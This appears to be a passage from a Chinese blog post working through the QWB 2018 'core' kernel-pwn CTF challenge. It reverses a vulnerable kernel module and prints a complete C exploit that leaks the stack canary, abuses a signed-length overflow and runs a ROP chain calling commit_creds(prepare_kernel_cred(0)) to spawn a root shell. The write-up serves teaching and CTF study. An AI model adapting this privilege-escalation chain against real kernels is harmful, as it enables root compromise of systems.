<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">add-symbol-file vmlinux addr_of_vmlinux </span><br><span class="line">add-symbol-file ./your_module.ko addr_of_ko</span><br></pre></td></tr></table></figure></div>



<h4 id="基础利用手法"><a href="#基础利用手法" class="headerlink" title="基础利用手法"></a>基础利用手法</h4><h5 id="kernel-ROP"><a href="#kernel-ROP" class="headerlink" title="kernel ROP"></a>kernel ROP</h5><h4 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h4><h5 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 - core"></a>强网杯 2018 - core</h5><p>首先我们解压文件系统，这里发现给出的<strong>core.cpio</strong>，但其类型是gzip压缩，所以我们要先用gunzip解压一下。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117004743103.png"
                      class=""
                >

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> core.cpio ./core.cpio.gz</span><br><span class="line">gunzip core.cpio.gz</span><br><span class="line">cpio -idmv &lt; core.cpio</span><br></pre></td></tr></table></figure></div>



<p>题目给出了<strong>gen_cpio.sh</strong>，这个是用来重新打包文件系统的，以便我们修改init。其会把当前目录下所有内容打包，压缩并输出到我们命令行提供第一个参数所指定的目录处。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#gen_cpio.sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span></span><br></pre></td></tr></table></figure></div>

<p>start.sh以及init文件的内容如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#start.sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment">#init</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>然后我们尝试启动内核，但是会卡在启动界面，经过调试，我们把start.sh中的内存指派64M改为128M，就能够正常进入内核环境。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117005845709.png"
                      class=""
                >

<p>然后我们仔细看看init里面的内容，发现存在2分钟定时关闭，而且启动的shell是普通用户的shell(uid为1000)，并且禁用了dmesg的内核日志查看以及直接<code>cat /proc/kallsyms</code>获取符号位置。但这道题的init中还是贴心的先把<code>/proc/kallsyms</code>迁移到了<code>/tmp/kallsyms</code>，那么其实我们还是能查看符号的偏移位置。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117010622321.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117010705905.png"
                      class=""
                >

<p>为了后续调试方便，我们可以修改init文件并重新对文件系统进行打包。对init改动处有两点，首先把poweroff的部分都注释掉，然后把<code>setsid /bin/cttyhack setuidgid 1000 /bin/sh</code>中的1000改成0，从而去除了关机以及以root权限启动shell。之后重新打包。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./gen_cpio.sh ./mycore.cpio.gz</span><br><span class="line">gunzip mycore.cpio.gz</span><br><span class="line">cpio -idmv &lt; mycore.cpio</span><br></pre></td></tr></table></figure></div>

<p>之后在<strong>start.sh</strong>中把<strong>core.cpio</strong>改为<strong>mycore.cpio</strong>即可，之后启动就不会自动关机，且权限为root了。</p>
<p>然后就是看<strong>core.ko</strong>这个内核驱动模块的漏洞了。</p>
<p><strong>init_module</strong>注册了**&#x2F;proc&#x2F;core<strong>，</strong>exit_core<strong>删除了</strong>&#x2F;proc&#x2F;core**</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117144829081.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117144951857.png"
                      class=""
                >

<p><strong>core_ioctl</strong>这个相当于堆题的菜单，有不同的功能选项。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145051360.png"
                      class=""
                >

<p><strong>core_read</strong>从 <code>v4[off]</code> 拷贝 64 个字节到a1，a1也就是后面我们可以传入的用户空间的一个缓冲区，而且全局变量 <code>off</code> 是我们能够控制的，因此可以合理的控制 <code>off</code> 来 将canary 和一些地址读取到用户空间的缓冲区，然后再自己把这个缓冲区内的内容输出，从而能泄露内核空间的一些地址。 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145312844.png"
                      class=""
                >

<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了。 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145441269.png"
                      class=""
                >

<p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145616435.png"
                      class=""
                >

<p>由于是第一次接触kernel pwn的exp编写，我这里直接拿exp来进行分析学习。这里先解释一下我们exp的目的，就是提权，像什么system(“&#x2F;bin&#x2F;sh”)，我们的exp实际可以直接调用，但是拿到的只是uid&#x3D;1000的普通用户的权限。我们希望通过一系列内核漏洞的利用，最终能提高权限。而且内核漏洞的exp一般都是用c语言编写的，而不是之前所学pwn用python写exp脚本。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * give_to_player [master●●] check ./core.ko</span></span><br><span class="line"><span class="comment">   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436d</span></span><br><span class="line"><span class="comment">   [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#x27;</span></span><br><span class="line"><span class="comment">       Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">       RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">       Stack:    Canary found</span></span><br><span class="line"><span class="comment">       NX:       NX enabled</span></span><br><span class="line"><span class="comment">       PIE:      No PIE (0x0)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);            <span class="comment">//打开符号表，获取各符号偏移</span></span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))        <span class="comment">//48条项目一组，一直找commit_creds和prepare_kernel_cred符号的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);                  <span class="comment">//地址在前16个字节</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);     <span class="comment">//以llx模式解析16个字节，正确解析出地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中获取<strong>commit_creds</strong>等内核符号相对基址偏移的方式如下，得到偏移后，我们只要在运行exp时读取**&#x2F;tmp&#x2F;kallsyms<strong>得到符号的真实地址，然后减去偏移之后就能得到</strong>虚拟地址符号基址<strong>。而且没有开启PIE保护下，我们可以看到内核映像默认加载基地址。这个地址是内核映像在物理内存中的加载地址，表示内核的起始位置。而</strong><code>/proc/kallsyms</code> 中的符号地址** 是内核符号（如函数名、变量名等）在内核虚拟地址空间中的位置。由于 Linux 内核会进行地址空间布局随机化（ASLR），即使内核的物理地址是固定的，它在虚拟地址空间中的位置可能会有所不同。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117153339477.png"
                      class=""
                >

<p>首先我们先保存cs，rflags等信息，以便以后返回用户态。然后打开我们的内核模块core.ko中所注册的&#x2F;proc&#x2F;core获得一个文件描述符，那么之后就可以利用ioctl进行操作。然后我们就可以获取到核心的<strong>commit_creds</strong>和<strong>prepare_kernel_cred</strong>地址。我们的目标是调用**commit_creds(prepare_kernel_cred(0));**进行提权。各函数的具体实现可以看exp中的具体代码，还是比较简单的。因为我们找到的gadget等地址都是固定的物理地址空间的地址，我们想要的是虚拟空间地址，所以还要算出相对偏移。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">save_status();</span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">find_symbols();</span><br><span class="line"><span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line"><span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;		<span class="comment">//虚拟地址空间相对于物理地址空间偏移</span></span><br></pre></td></tr></table></figure></div>

<p>之后最核心的就是与注册的core设备进行交互，具体实现采用的是ioctl方式，每个函数对应之前IDA中所看到的内核模块的功能。但我们能发现core.ko中<strong>core_ioctl</strong>函数中只会调用<strong>core_read</strong>和<strong>core_copy_func</strong>，而没有<strong>core_write</strong>的调用。其实我们也可以在用户态直接**write(fd, buf, len);**来调用到这个函数（fd为该设备的描述符）。</p>
<p>首先是泄露canary，我们从IDA就可以看出canary相距v4有0x40个字节。<code>copy_to_user(a1, &amp;v4[off], 64LL)</code>又能直接读出64个字节到用户空间，那么只要我们先把全局变量<strong>off</strong>设置为0x40，然后再用<strong>core_read</strong>函数，就能够将从canary开始的64个字节读取出来。也就泄露了canary。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">core_read(fd, buf);</span><br><span class="line"><span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br></pre></td></tr></table></figure></div>

<p>这里我们可以动调一下先看看，gdb从vmlinux启动，然后把core.ko作为symbol file附加上，之后就能在想要的位置处下断点了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117165103393.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117170701255.png"
                      class=""
                >

<p>那么我们先把exp编译出来，然后重新打包文件系统，再次启动在虚拟环境下运行exp，就能用gdb进行调试。这里比如我们在<strong>core_ioctl</strong>下断点。能够成功在这里断下来。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117171647372.png"
                      class=""
                >

<p>之后我们看<strong>core_read</strong>这个具体的过程，会发现<strong>copy_to_user</strong>执行完后，rbx指向了用户态的栈区域，也成功的把内核态中的canary以及之后的64个字节复制到了用户态的栈中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117232044372.png"
                      class=""
                >

<p>然后就是写ROP，用的是ropper找出的gadget。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line"><span class="built_in">cat</span> g1 | grep <span class="string">&#x27;pop rdi; ret&#x27;</span>  </span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>

<p>这里rop链中<code>mov rdi,rax</code>可以把<code>prepare_kernel_cred(0)</code>返回的内容作为参数传入<code>commit_creds</code>中，因为gadget中的<code>mov rdi,rax</code>后面还会call rdx，所以前两个pop ret都是为了抵消call rdx的作用的。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br></pre></td></tr></table></figure></div>

<p>执行完<strong>core_copy_func</strong>后，就成功把rop链写在了内核的栈上</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118001545125.png"
                      class=""
                >

<p>之后我们重点看看返回用户态所用的<strong>swapgs</strong>，<strong>popfq</strong>，<strong>iretq</strong>具体做了什么。</p>
<p>首先swapgs会切换gs寄存器，先后对比如下。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118003618379.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118003632606.png"
